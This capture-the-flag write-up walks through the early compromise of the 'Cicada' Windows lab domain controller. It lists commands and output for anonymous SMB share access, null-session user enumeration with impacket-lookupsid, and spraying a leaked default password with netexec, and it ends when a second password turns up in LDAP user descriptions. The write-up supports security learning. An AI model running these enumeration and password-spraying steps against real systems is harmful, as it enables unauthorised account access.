# Machine Name: Cicada  
# Machine IP:   
# Difficulty: Easy  
# Type: Windows  

First of all we started by scanning for open ports:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ rustscan -a 10.129.3.47  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/faridd/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.3.47:53
Open 10.129.3.47:88
Open 10.129.3.47:135
Open 10.129.3.47:139
Open 10.129.3.47:389
Open 10.129.3.47:445
Open 10.129.3.47:464
Open 10.129.3.47:636
Open 10.129.3.47:3268
Open 10.129.3.47:3269
Open 10.129.3.47:5985
```
Let's look at the shared folders to find any public but sensitive information:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ smbclient -L //10.129.3.47/ -N               

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
We accessed the DEV share but cannot see its content, we dont have permission to do. So, lets check the HR folder.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ smbclient //10.129.3.47/HR -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 16:29:09 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 21:31:48 2024
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (4.0 KiloBytes/sec) (average 4.0 KiloBytes/sec)
smb: \> exit
```
Just look at its content. It simply says that "Hey you are new employee and we set default password to you **(Cicada$M6Corpb*@Lp#nZp!8)**. Just change it immediately". It gives us a hint. Maybe there are other users that were set by this default password but don't change it.     
That is why I decided to fetch all the users and check this password on them. Because I couldn't do anything with this user. It is a guest user and I proved it by this command:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ netexec smb 10.129.3.47 -u Cicada -p 'Cicada$M6Corpb*@Lp#nZp!8' 
SMB         10.129.3.47     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.3.47     445    CICADA-DC        [+] cicada.htb\Cicada:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
```
We couldn't send ldap requests for enumerating users. I checked kerbrute and it was slow because of the large scope of the wordlist. So, I decided to use impacket tool --> **impacket-lookupsid**   
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```
* -no-pass means dont use password for connecting. It works for the guest user because it is considered as null session.  

----
After gathering the usernames, we can bruteforce the default password for them:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ netexec smb 10.129.3.47 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' | grep [+] 
SMB                      10.129.3.47     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
Only the **'michael.wrightson'** user has this default password. I checked smb shares, winrm but none of them gave any essential hint. So, I remembered that in the previous users, we were guest it means we weren't the authenticated domain user.     
So, I couldn't send ldap queries. But now, I can look at the user's description fields by the help of ldap. Because sometimes there can be forgotten passwords.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/cicada]
└─$ netexec ldap 10.129.3.47 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
LDAP        10.129.3.47     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.3.47     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.129.3.47     389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.129.3.47     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.3.47     389    CICADA-DC        Administrator                 2024-08-27 00:08:03 1        Built-in account for administering the computer/domain      
LDAP        10.129.3.47     389    CICADA-DC        Guest                         2024-08-28 21:26:56 0        Built-in account for guest access to the computer/domain    
LDAP        10.129.3.47     389    CICADA-DC        krbtgt                        2024-03-14 15:14:10 1        Key Distribution Center Service Account                     
LDAP        10.129.3.47     389    CICADA-DC        john.smoulder                 2024-03-14 16:17:29 1                                                                    
LDAP        10.129.3.47     389    CICADA-DC        sarah.dantelia                2024-03-14 16:17:29 1                                                                    
LDAP        10.129.3.47     389    CICADA-DC        michael.wrightson             2024-03-14 16:17:29 0                                                                    
LDAP        10.129.3.47     389    CICADA-DC        david.orelious                2024-03-14 16:17:29 0        Just in case I forget my password is aRt$Lp#7t*VQ!3         
LDAP        10.129.3.47     389    CICADA-DC        emily.oscars                  2024-08-23 01:20:17 0
```
Yeahh, we have the password of **'david.orelious'** user !!!!   






































